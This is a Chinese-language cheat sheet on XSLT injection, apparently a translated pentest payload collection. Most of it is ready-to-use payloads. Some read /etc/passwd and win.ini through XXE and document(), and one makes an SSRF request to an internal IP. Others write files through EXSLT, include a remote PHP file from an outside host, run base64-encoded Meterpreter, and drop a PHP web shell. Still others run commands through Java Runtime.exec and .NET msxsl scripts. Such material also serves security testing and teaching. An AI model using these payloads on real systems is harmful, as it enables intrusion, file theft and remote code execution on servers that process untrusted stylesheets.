# XSLT 注入

> 处理未经验证的 XSL 样式表可能会允许攻击者更改结果 XML 的结构和内容、从文件系统中包含任意文件或执行任意代码。

## 概述

- [工具](#工具)
- [方法论](#方法论)
    - [确定供应商和版本](#确定供应商和版本)
    - [外部实体](#外部实体)
    - [使用 document 读取文件和 SSRF](#使用-document-读取文件和-ssrf)
    - [使用 EXSLT 扩展写入文件](#使用-exslt-扩展写入文件)
    - [使用 PHP 包装器进行远程代码执行](#使用-php-包装器进行远程代码执行)
    - [使用 Java 进行远程代码执行](#使用-java进行远程代码执行)
    - [使用原生 .NET 进行远程代码执行](#使用原生-.net进行远程代码执行)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 工具

目前没有已知的工具可以帮助进行 XSLT 利用。

## 方法论

### 确定供应商和版本

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
 <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />版本: <xsl:value-of select="system-property('xsl:version')" />
<br />供应商: <xsl:value-of select="system-property('xsl:vendor')" />
<br />供应商 URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

### 外部实体

遇到 XSLT 文件时不要忘记测试 XXE。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    水果 &ext_file;:
    <!-- 遍历每个水果 -->
    <xsl:for-each select="fruit">
      <!-- 打印名称: 描述 -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

### 使用 document 读取文件和 SSRF

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    水果:
    <!-- 遍历每个水果 -->
    <xsl:for-each select="fruit">
      <!-- 打印名称: 描述 -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

### 使用 EXSLT 扩展写入文件

EXSLT，即可扩展样式表语言转换，是 XSLT（可扩展样式表语言转换）语言的一组扩展。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

### 使用 PHP 包装器进行远程代码执行

执行函数 `readfile`。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

执行函数 `scandir`。

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
  </xsl:template>
</xsl:stylesheet>
```

使用 `assert` 执行远程 PHP 文件。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
  <xsl:variable name="payload">
    include("http://10.10.10.10/test.php")
  </xsl:variable>
  <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

使用 PHP 包装器执行 PHP meterpreter。

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:variable name="eval">
      eval(base64_decode('Base64-encoded Meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
  </xsl:template>
</xsl:stylesheet>
```

使用 `file_put_contents` 执行远程 PHP 文件。

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
```

### 使用 Java 进行远程代码执行

```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
```

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
```

### 使用原生 .NET 进行远程代码执行

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- BEGIN COMMAND OUTPUT ---
 <xsl:value-of select="user:execute()"/>
  --- END COMMAND OUTPUT --- 
  </xsl:template>
</xsl:stylesheet>
```

## 实验室

- [Root Me - XSLT - 代码执行](https://www.root-me.org/en/Challenges/Web-Server/XSLT-Code-execution)

## 参考文献

- [从 XSLT 代码执行到 Meterpreter shell - Nicolas Grégoire (@agarri) - 2012年7月2日](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
- [XSLT 注入 - Fortify - 2021年1月16日](http://web.archive.org/web/20210116001237/https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
- [XSLT 注入基础 - Saxon - Hunnic Cyber Team - 2019年8月21日](http://web.archive.org/web/20190821174700/https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
- [使用 ChatGPT 在浏览器中获得 XXE - Igor Sak-Sakovskiy - 2024年5月22日](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
- [XSLT 注入导致文件创建 - PT SWARM (@ptswarm) - 2024年5月30日](https://twitter.com/ptswarm/status/1796162911108255974/photo/1)